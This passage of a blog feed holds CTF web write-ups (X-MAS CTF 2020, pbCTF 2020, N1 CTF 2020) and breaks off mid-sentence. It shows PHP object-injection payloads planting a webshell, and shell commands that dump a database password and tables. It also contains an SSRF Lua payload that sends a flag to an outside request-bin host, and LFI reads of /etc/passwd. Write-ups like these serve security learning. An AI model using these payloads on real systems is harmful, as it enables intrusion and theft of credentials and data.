Injection.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:9:&quot;file_name&quot;;s:10:&quot;.&#x2F;abcd.php&quot;;s:10:&quot;newContent&quot;;s:20:&quot;&lt;?php system(&quot;ls&quot;)?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, I just wrote a simple payload and sent it as above, but the file was not created well. So, mentality went out and did this and that, and suddenly <code>as3617</code> released PHP Object Injection PPT.</p><p>Looking at this PPT, I learned that when a variable is defined as Private, Null Byte is attached to both sides of the variable.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:11:&quot;file_name&quot;;s:10:&quot;.&#x2F;abcd.php&quot;;s:12:&quot;newContent&quot;;s:20:&quot;&lt;?php system(&quot;ls&quot;)?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, based on this, I wrote the payload again as above, but it didnâ€™t work well. So I couldnâ€™t solve the problem because of this. </p><p>So, after the contest, I asked a person belonging to Defenit who was all over the web. It turns out that if the variable is defined as private, you need to reference the variable like \x00classname\x00variable.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;pageContent&quot;:2:&#123;s:22:&quot;ï¿½pageContentï¿½file_name&quot;;s:15:&quot;data&#x2F;pyburp.php&quot;;s:23:&quot;ï¿½pageContentï¿½newContent&quot;;s:15:&quot;&lt;?&#x3D;&#96;$_GET[x]&#96;?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>So, finally, I wrote the payload as above.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/How%20Brutus%20stol/2.png?raw=true"><br>When I uploaded the webshell and accessed the file, I was able to confirm that the webshell was uploaded well.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;</span><br><span class="line">output &#x3D;&gt; ctfx</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx</span><br><span class="line">output &#x3D;&gt; composer.json composer.lock htdocs include install writable</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx&#x2F;include</span><br><span class="line">output &#x3D;&gt; Config.php cache.inc.php captcha.inc.php config config_loader.inc.php constants.inc.php db.inc.php email.inc.php files.inc.php general.inc.php json.inc.php language layout mellivora.inc.php raceconditions.inc.php session.inc.php thirdparty two_factor_auth.inc.php xsrf.inc.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;ls ~&#x2F;ctfx&#x2F;include&#x2F;config</span><br><span class="line">&#x3D;&gt; config.default.inc.php db.default.inc.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;cat ~&#x2F;ctfx&#x2F;include&#x2F;config&#x2F;db.default.inc.php</span><br><span class="line">output &#x3D;&gt; </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> *</span><br><span class="line"> * This file contains default configuration.</span><br><span class="line"> *</span><br><span class="line"> *        DO NOT MAKE CHANGES HERE</span><br><span class="line"> *</span><br><span class="line"> * Copy this file and name it &quot;db.inc.php&quot;</span><br><span class="line"> * before making any changes. Any changes in</span><br><span class="line"> * db.inc.php will override the default</span><br><span class="line"> * config. It is also possible to override</span><br><span class="line"> * configuration options using environment</span><br><span class="line"> * variables. Environment variables override</span><br><span class="line"> * both the default settings and the hard-coded</span><br><span class="line"> * user defined settings.</span><br><span class="line"> *</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_ENGINE&#39;, &#39;mysql&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_HOST&#39;, &#39;localhost&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_PORT&#39;, 3306);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_NAME&#39;, &#39;mellivora&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_USER&#39;, &#39;mellivora&#39;);</span><br><span class="line">Config::set(&#39;MELLIVORA_CONFIG_DB_PASSWORD&#39;, &#39;rac9138cn98ascnascud&#39;);</span><br></pre></td></tr></table></figure><p>When I checked using a web shell, I could see that the Database configuration file exists. Then, letâ€™s connect to the DB using the mysql command.<br><img src="https://github.com/wjddnjs33/image/blob/main/X-MAS-CTF-2020/How%20Brutus%20stol/3.png?raw=true"><br>[+] If you know the database name, user name, and password, you can run the query as above using the -e option of the mysql command and see the result immediately.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e &quot;show tables;&quot;</span><br><span class="line">output &#x3D;&gt; Tables_in_mellivora categories challenges cookie_tokens countries exceptions files hints ip_log news reset_password submissions two_factor_auth user_types users</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050&#x2F;data&#x2F;pyburp.php?x&#x3D;mysql -D mellivora -u mellivora -prac9138cn98ascnascud -e &quot;select * from challenges&quot;</span><br><span class="line">output &#x3D;&gt; </span><br><span class="line">idaddedadded_bytitlecategorydescriptionexposedavailable_fromavailable_untilflagcase_insensitiveautomarkpointsinitial_pointsminimum_pointssolve_decaysolvesnum_attempts_allowedmin_seconds_between_submissionsrelies_on</span><br><span class="line">116060783851Brutus1Everyone hates Brutus! But does Brutus hate everyone? Who knows? Or rather, who cares?! What we care about here is the flag. Nothing more.</span><br><span class="line">\n</span><br><span class="line">\nLink: [url]http:&#x2F;&#x2F;challs.xmas.htsp.ro:3050[&#x2F;url]115846992001617235206pwngyanctf&#123;we_dont_remember_the_actual_flag_:(&#125;01500500501002050</span><br><span class="line">216060810561Hard Challenge1Now it&#39;s time for a ramp-up in difficulty. You thought Brutus was hard? Ha! Check this one out then, punk.</span><br><span class="line">\n</span><br><span class="line">\nLink: [url]http:&#x2F;&#x2F;challs.xmas.htsp.ro:3051[&#x2F;url]115846992001617235206X-MAS&#123;Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0&#125;01500500501000050</span><br><span class="line">316060811361Hello World!2Welcome to PWNgyan CTF 2020!</span><br><span class="line">\n</span><br><span class="line">\n[b]pwngyanctf&#123;H3ll0_H4ckerz_3141cc5f&#125;[&#x2F;b]115846992001617235206pwngyanctf&#123;H3ll0_H4ckerz_3141cc5f&#125;0110101013050</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>When I ran through the database using the mysql command, there was a flag of the table called challenges.</p><blockquote><p>FLAG : X-MAS{Brutus_why_d1d_y0u_h4v3_t0_h4v3_RCE_113c41afe0}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blind Command Injection </tag>
            
            <tag> Hash Length Extension Attack </tag>
            
            <tag> XSS </tag>
            
            <tag> PHP Object Injection </tag>
            
            <tag> Type juggling </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pbCTF 2020 Write Up</title>
      <link href="2020/12/07/2020-12-07-pb-CTF/"/>
      <url>2020/12/07/2020-12-07-pb-CTF/</url>
      
        <content type="html"><![CDATA[<p>I participated by opening the CTF this time at Perfect Blue. Letâ€™s write Write Up only for web challenges solved by CTF.</p><hr><h2 id="Web-Sploosh-156-pts"><a href="#Web-Sploosh-156-pts" class="headerlink" title=" (Web) Sploosh [156 pts]"></a><span style="color:#21C587"></span> (Web) Sploosh [156 pts]</h2><p>This time, we will solve a problem called Sploosh among web challenge from pbCTF.<br><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Sploosh/1.png?raw=true"><br>When you come into challenge, you can see that there is a form for entering the URL, and you can download the source code by clicking here.<br><br></p><p>Once you think about it before looking at the source code, you might be suspicious of <code>SSRF</code> because it has the ability to type in the url.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fail</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&#123;&#125;&quot;</span>;</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$url</span> === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$json</span> = file_get_contents(<span class="string">&quot;http://splash:8050/render.json?timeout=1&amp;url=&quot;</span> . urlencode(<span class="variable">$url</span>));</span><br><span class="line">  <span class="variable">$out</span> = <span class="keyword">array</span>(<span class="string">&quot;geometry&quot;</span> =&gt; json_decode(<span class="variable">$json</span>)-&gt;geometry);</span><br><span class="line">  <span class="keyword">echo</span> (<span class="variable">$out</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">  fail();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Letâ€™s check the api.php source code. You can see that the url is input and the file is opened and checked with the file_get_contents() function. And you can see that the file value is output as the geometry value.<br><br><br><br>SSRF seems to be fired by the <code>file_get_contents()</code> function of api.php.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$remote_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$remote_ip</span> === <span class="string">&quot;172.16.0.13&quot;</span> || <span class="variable">$remote_ip</span> === <span class="string">&#x27;172.16.0.14&#x27;</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;No flag for you :)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Letâ€™s check the source code of flag.php. If the connection IP is <code>172.16.0.13</code> or <code>172.16.0.14</code>, you can see the flag is given.</p><p>And looking at the flag.php source code, you can see that the flag is only output on the internal server. So it looks like we need to put the flag in a specific variable and bring it to our private server.</p><p>Now Iâ€™ve searched for Sploosh to do an exploit. If you check <a href="https://splash.readthedocs.io/en/stable/scripting-tutorial.html#scripting-tutorial">Splooshâ€™s official homepage</a>, you find that you can create and run Lua scripts by connecting to the <code>execute</code> endpoint.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Sploosh/2.png?raw=true"></p><p>The picture above is on the official Sploosh website. Looking at the contents, you can see that the <code>execute</code> endpoint sends the RCE payload using the lua_source parameter.</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">(exploit, args)</span></span></span><br><span class="line">  exploit:go(<span class="string">&quot;http://172.16.0.14/flag.php&quot;</span>)</span><br><span class="line">  <span class="keyword">local</span> flag = splash:html()</span><br><span class="line">  exploit:go(<span class="string">&quot;requestbin&quot;</span> .. flag)</span><br><span class="line">  <span class="keyword">return</span> &#123;geometry=data&#125;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>So, I wrote the SSRF + RCE payload as above using the lua script.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = requests.get(<span class="string">&quot;http://172.16.0.14/flag.php&quot;</span>)</span><br><span class="line">requests.get(<span class="string">&quot;requestbin&quot;</span>+flag)</span><br></pre></td></tr></table></figure><p>If the exploit code is interpreted in Python, it is as above.</p><p>Finally, if you connect and send the exploit code above to the excute endpoint, a flag will come to requestbin. (<code>URL encoding</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : http%3A%2F%2Flocalhost%3A8050%2Fexecute%3Flua_source%3Dfunction%2520main%28splash%2C%2520args%29%2520splash%3Ago%28%2522http%3A%2F%2F172.16.0.14%2Fflag.php%2522%29%2520local%2520data%2520%3D%2520splash%3Ahtml%28%29%2520splash%3Ago%28%2522https:&#x2F;&#x2F;66409bdd5f994b912d1a7f0f28d3b33f.m.pipedream.net%2F%2522%2520..%2520data%29%2520return%2520%7Bgeometry%3Ddata%7D%2520end</span><br></pre></td></tr></table></figure><p>So, Iâ€™ll URL-encode the exploit code and pass it over.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Sploosh/3.png?raw=true"></p><p>When I sent the above exploit payload, I could see the flag coming to the requestbin.</p><blockquote><p>FLAG : pbctf{1_h0p3_y0u_us3d_lua_f0r_th1s}</p></blockquote><hr><h2 id="Web-Apoche-I-58-pts"><a href="#Web-Apoche-I-58-pts" class="headerlink" title=" (Web) Apoche I [58 pts]"></a><span style="color:#21C587"></span> (Web) Apoche I [58 pts]</h2><p>This time, we will solve a challenge called Apoche I among web challenge from pbCTF.<br><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Apoche%20I/1.png?raw=true"><br>Looking at the challenge description, there are 5 URLs given. You can connect to an open server among 5 servers. (Some servers are closed.)</p><p>And looking at the hint, it says to get information about the binary.<br><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Apoche%20I/2.png?raw=true"><br>I connected to 34.68.159.75:41521, and when I checked the robots.txt file, I could see that there is a secret directory. I thought LFI would happen here, so I grabbed a proxy and attempted an LFI attack.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Apoche%20I/3.png?raw=true"><br>When I grabbed the request using Burp Suite and accessed the <code>/etc/passwd</code> file, I could see that the <code>LFI</code> worked well.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/Apoche%20I/4.png?raw=true"><br>So I accessed <code>/proc/self/exe</code> to get the <code>binary file</code>, and when I searched for <code>pbctf&#123;</code>, I could see that the binary file had a flag.</p><blockquote><p>FLAG : pbctf{n0t_re4lly_apache_ap0che!}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Path Traversal </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N1 CTF 2020 Write Up</title>
      <link href="2020/10/14/2020-10-19-N1-CTF.2020/"/>
      <url>2020/10/14/2020-10-19-N1-CTF.2020/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-SignIn-138-pts"><a href="#Web-SignIn-138-pts" class="headerlink" title="(Web) SignIn [138 pts]"></a>(Web) SignIn [138 pts]</h2><blockquote><p>SignIn ë¬¸ì œëŠ” PHP Object Injectionê³¼ SQL Injectionì„ ì´ìš©í•´ì„œ í”Œë˜ê·¸ë¥¼ íšë“í•˜ëŠ” ë¬¸ì œì…ë‹ˆë‹¤.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ip</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="keyword">$this</span>-&gt;waf(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip =<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$con</span>=mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;********&quot;</span>,<span class="string">&quot;n1ctf_websign&quot;</span>);</span><br><span class="line">        <span class="variable">$sqlquery</span>=sprintf(<span class="string">&quot;INSERT into n1ip(`ip`,`time`) VALUES (&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;</span>,<span class="keyword">$this</span>-&gt;waf(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]),time());</span><br><span class="line">        <span class="keyword">if</span>(!mysqli_query(<span class="variable">$con</span>,<span class="variable">$sqlquery</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> mysqli_error(<span class="variable">$con</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;your ip looks ok!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_close(<span class="variable">$con</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip = <span class="variable">$ip</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;check)===md5(<span class="string">&quot;key****************&quot;</span>))&#123;</span><br><span class="line">    readfile(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">&quot;n1ctf&quot;</span>)!==<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">&quot;welcome to n1ctf2020&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">&quot;noip&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$input</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>ip</code>ë¼ëŠ” í´ë˜ìŠ¤ë¥¼ í™•ì¸í•´ ë³´ë©´ ë¨¼ì € <code>__construct()</code> ë©”ì„œë“œê°€ ì‹¤í–‰ì´ ë  ê±´ë°, í•´ë‹¹ ë©”ì„œë“œê°€ ì‹¤í–‰ì´ ë˜ë©´ <code>X_Forwarded_for</code>ì´ë¼ëŠ” ë³€ìˆ˜ ì„¤ì • ìœ /ë¬´ë¥¼ í™•ì¸í•˜ê³ , ì„¤ì •ì´ ë˜ì–´ ìˆë‹¤ë©´ <code>X_Forwarded_for</code>ì˜ ê°’ì„ ì•„ì´í”¼ì˜ ê°’ìœ¼ë¡œ ì‚¬ìš©í•˜ê³ , ì„¤ì •ì´ ì•ˆ ë˜ì–´ ìˆë‹¤ë©´ ì•„ì´í”¼ì˜ ê°’ìœ¼ë¡œ <code>Remote_Addr</code> ê°’ì„ ë„£ì–´ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><code>__construct()</code> ë©”ì„œë“œê°€ ì‹¤í–‰ëœ í›„ì— <code>__toString(</code>) ë©”ì„œë“œê°€ ì‹¤í–‰ì´ ë˜ëŠ” ë°, í•´ë‹¹ ë©”ì„œë“œëŠ” í´ë˜ìŠ¤ ìì²´ê°€ ë¬¸ìì—´ë¡œ ì²˜ë¦¬ë¥¼ ë  ë•Œ ì‹¤í–‰ì´ ëœë‹¤ê³  í•©ë‹ˆë‹¤. ê·¸ë˜ì„œ í´ë˜ìŠ¤ê°€ ë¬¸ìì—´ë¡œ ì²˜ë¦¬ê°€ ë¼ì„œ ì‹¤í–‰ì´ ë˜ë©´ <code>mysqli_query()</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ì„œ Insert ë¬¸ ìš”ì²­ì„ ë³´ë‚´ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ip</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ip</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip = <span class="variable">$ip</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;check)===md5(<span class="string">&quot;key****************&quot;</span>))&#123;</span><br><span class="line">    readfile(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">&quot;n1ctf&quot;</span>)!==<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">&quot;welcome to n1ctf2020&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">&quot;noip&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>flag</code>ë¼ëŠ” í´ë˜ìŠ¤ë¥¼ í™•ì¸í•´ ë³´ë©´ <code>__construct()</code> ë©”ì„œë“œê°€ 